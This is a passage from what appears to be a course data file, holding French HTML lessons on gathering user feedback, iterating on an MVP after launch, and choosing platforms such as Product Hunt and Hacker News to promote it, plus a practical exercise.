<p>Monitore les mentions de ton produit sur Twitter, LinkedIn et les forums. Les utilisateurs partagent souvent leur feedback publiquement — positif où négatif. Chaque email de support est aussi une mine d'or : si 3 utilisateurs posent la même question, c'est un problème d'UX, pas un problème d'utilisateur.</p>
<p><strong>Conseil pro :</strong> Classe tout le feedback dans une grille simple : importance (critique / important / nice to have) x fréquence (demandé par beaucoup / quelques-uns / un seul). Les fonctionnalités demandées par beaucoup et classées comme critiques sont tes priorités absolues.</p>

<h2>Itérer rapidement</h2>
<p>Le lancement n'est pas la fin — c'est le début de la boucle d'itération. Le cycle d'un MVP réussi tient en trois mots : Ship, Learn, Repeat. Tu déploies, tu apprends des utilisateurs, tu améliores, tu redéploies. Chaque cycle te rapproche du product-market fit — ce moment magique où ton produit répond si bien au besoin que les utilisateurs viennent d'eux-mêmes.</p>
<p><strong>Le framework d'itération :</strong></p>
<ul>
<li><strong>Semaine 1-2 après le lancement</strong> : Corrige les bugs bloquants et les frictions UX majeures. C'est le mode pompier — tu éteins les feux. Les corrections de cette période ont le plus grand impact sur la rétention.</li>
<li><strong>Semaine 3-4</strong> : Implémente les 2-3 fonctionnalités les plus demandées. Pas plus. Reste focalisé. Chaque fonctionnalité ajoutée est une fonctionnalité à maintenir.</li>
<li><strong>Mois 2+</strong> : Optimisé les métriques clés (conversion, activation, rétention). C'est le mode croissance — tu affines ce qui marché et tu abandonnes ce qui ne marché pas.</li>
</ul>
<p><strong>La matrice d'impact pour prioriser :</strong></p>
<p>Face à une liste de 50 améliorations possibles, utilise cette matrice simple : chaque idée reçoit un score d'impact (1-5) et un score d'effort (1-5). Calcule le ratio impact/effort. Les idées avec un ratio élevé (impact fort, effort faible) passent en premier. Par exemple : "corriger le bug d'inscription" = impact 5, effort 1 = ratio 5 (priorité absolue). "Refondre entièrement le dashboard" = impact 3, effort 5 = ratio 0.6 (ça peut attendre).</p>
<p>Quelques principes pour itérer efficacement :</p>
<ul>
<li><strong>Déploie souvent</strong> : Avec Vercel et le déploiement continu, tu peux déployer 5 fois par jour. Préfère des petites mises à jour fréquentes à de grosses releases rares. Plus les changements sont petits, plus il est facile d'identifier ce qui a cassé si quelque chose ne va pas.</li>
<li><strong>Mesure avant et après</strong> : Chaque changement doit être mesurable. Tu modifies la landing page ? Compare le taux de conversion avant et après. Tu simplifies un formulaire ? Vérifie si le taux de complétion augmente.</li>
<li><strong>Résiste au feature creep</strong> : La tentation d'ajouter "juste une fonctionnalité de plus" est permanente. Chaque fonctionnalité à un coût caché : maintenance, documentation, support, complexité de l'interface. Ajoute seulement ce qui à un impact démontré.</li>
</ul>
<p><strong>Astuce :</strong> Crée un changelog public (une page /changelog dans ton app) où tu listes les améliorations à chaque mise à jour. Les utilisateurs adorent voir que le produit évolue activement. Ça renforce la confiance et la fidélité. Un simple "Semaine du 15 mars : correction du bug d'export, nouveau filtre par date, amélioration des performances du dashboard" suffit.</p>

<h2>Où partager ton MVP</h2>
<p>Ton MVP est en ligne, tes premiers testeurs ont validé l'expérience. Maintenant, il faut le faire connaître. Voici les plateformes les plus efficaces pour lancer un produit tech, classées par impact potentiel.</p>
<p><strong>Product Hunt</strong></p>
<p>C'est LA plateforme de lancement pour les produits tech. Un bon lancement sur Product Hunt peut te rapporter des centaines voire des milliers de visiteurs en une journée. Prépare soigneusement ton lancement : un visuel accrocheur (thumbnail et galerie), une tagline claire en moins de 60 caractères, une description concise qui explique le problème résolu et la solution. Lance un mardi où un mercredi (les jours les plus actifs) et mobilise ton réseau pour les premières heures — le classement initial est crucial.</p>
<p><strong>Indie Hackers</strong></p>
<p>La communauté des solo-preneurs et des bootstrappers. Publie un post "Show IH" qui raconte ton histoire : le problème identifié, ta solution, ton stack technique, tes premiers résultats. La communauté est bienveillante et donne du feedback constructif. C'est aussi un excellent endroit pour trouver tes premiers utilisateurs payants.</p>
<p><strong>Hacker News (Show HN)</strong></p>
<p>La communauté tech la plus influente. Un post "Show HN" qui atteint la page d'accueil peut générer un trafic massif. Mais la communauté est exigeante : ton produit doit être techniquement intéressant, pas juste un énième clone. Rédige un titre descriptif et prépare-toi à répondre aux commentaires (parfois durs mais toujours instructifs).</p>
<p><strong>Reddit</strong></p>
<p>Les subreddits de niche sont des mines d'or. Si ton SaaS est un outil pour freelances, poste dans r/freelance. Un outil pour les designers ? r/webdesign. La règle : apporte de la valeur d'abord, ne fais pas de la pub brute. Explique comment tu as résolu le problème, partage ton parcours, et mentionne ton produit naturellement.</p>
<p><strong>Twitter / X</strong></p>
<p>Le "build in public" est un mouvement puissant sur Twitter. Partage ton parcours de construction en temps réel : les victoires, les galères, les chiffres, les leçons apprises. Les gens s'attachent à l'histoire du fondateur autant qu'au produit. Un thread qui raconte "Comment j'ai construit un SaaS en 4 semaines avec Claude Code" peut devenir viral et attirer tes premiers utilisateurs.</p>
<p><strong>LinkedIn</strong></p>
<p>Si ta cible est B2B (entreprises, professionnels), LinkedIn est incontournable. Un post de lancement qui combine storytelling personnel et présentation du produit génère de l'engagement et des leads qualifiés. Les publications sur LinkedIn ont une portée organique nettement supérieure aux autres réseaux — un bon post peut atteindre 10 000 vues même avec peu de connexions.</p>
<p><strong>Conseil pro :</strong> Ne lance pas partout en même temps. Choisis 2-3 plateformes, prépare chaque lancement soigneusement, et espace-les de quelques jours. Ça te permet d'absorber le trafic, de corriger les problèmes identifiés sur la première plateforme avant le lancement suivant, et de maintenir un momentum sur plusieurs semaines plutôt qu'un pic unique.</p>
<p><strong>Attention :</strong> Chaque plateforme a ses codes et sa culture. Un post qui marché sur Product Hunt ne marchera pas sur Hacker News. Adapte ton message, ton ton et ta présentation à chaque communauté. Prends le temps de lire les posts qui fonctionnent bien sur chaque plateforme avant de publier le tien.</p>

<blockquote>Le lancement n'est pas un événement — c'est un processus. Les meilleurs produits ne sont pas ceux qui ont eu le lancement le plus spectaculaire, mais ceux qui ont itéré le plus rapidement après le lancement. Chaque retour utilisateur est un cadeau — utilise-le pour construire quelque chose que les gens veulent vraiment.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Complète la checklist de pré-lancement pour ton MVP. Pour chaque élément, note "OK", "À faire" où "N/A". Corrige tous les éléments "À faire" avant de déployer.</li>
<li>Déploie ton MVP sur Vercel. Connecte ton repository GitHub, configure les variables d'environnement, lance le build et vérifie que tout fonctionne sur l'URL de prévisualisation. Si tu as un domaine, connecte-le.</li>
<li>Recrute 5 beta-testeurs et donne-leur 3 tâches concrètes à accomplir dans ton application. Observe (en visio si possible) comment ils s'y prennent et note chaque friction où confusion.</li>
<li>Crée un système de collecte de feedback : un formulaire in-app (même un simple bouton qui ouvre un Google Form), un tableau Notion pour centraliser les retours, et installe un outil d'analytics (Vercel Analytics où PostHog).</li>
<li>Rédige le post de lancement pour UNE plateforme de ton choix (Product Hunt, Indie Hackers, LinkedIn où Twitter). Inclus : le problème que tu résous, ta solution, une capture d'écran et un appel à l'action clair. Demande à Claude de t'aider à l'optimiser.</li>
</ol>`,
  },
];
